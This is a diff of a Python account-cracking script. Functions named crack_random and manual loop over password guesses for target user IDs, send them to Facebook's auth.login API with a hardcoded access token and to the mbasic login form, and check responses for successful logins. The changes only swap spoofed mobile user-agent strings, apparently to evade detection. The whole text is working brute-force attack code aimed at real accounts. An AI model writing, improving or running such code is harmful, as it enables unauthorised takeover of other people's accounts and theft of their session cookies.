@@ -845,7 +845,7 @@ def crack_random():
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				ua_api = random.choice(['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'Nokia5300/2.0 (05.00) Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows 7; rv:11.1) Gecko/20100101 firefox/11.0 UNTRUSTED/1.0'])
+				ua_api = random.choice(['MT6572/V1 Linux/3.4.5 Android/4.2.2 Release/10.10.2013 Browser/AppleWebKit534.30 Profile/MIDP-2.0 Configuration/CLDC-1.1 Mobile Safari/534.30 Android 4.2.2;'])
 				params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 				api = 'https://b-api.facebook.com/method/auth.login'
 				response = requests.get(api, params=params, headers={'user-agent': ua_api})
@@ -918,7 +918,7 @@ def manual():
 			pass
 		try:
 			for asu in pw.split(","):
-				ua_mb = random.choice(['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'Nokia5300/2.0 (05.00) Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/5.0 (Windows; U; Windows 7; rv:11.1) Gecko/20100101 firefox/11.0 UNTRUSTED/1.0'])
+				ua_mb = random.choice(['NokiaC2-00/2.0 (03.82) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; id; NokiaC2-00) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0'])
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
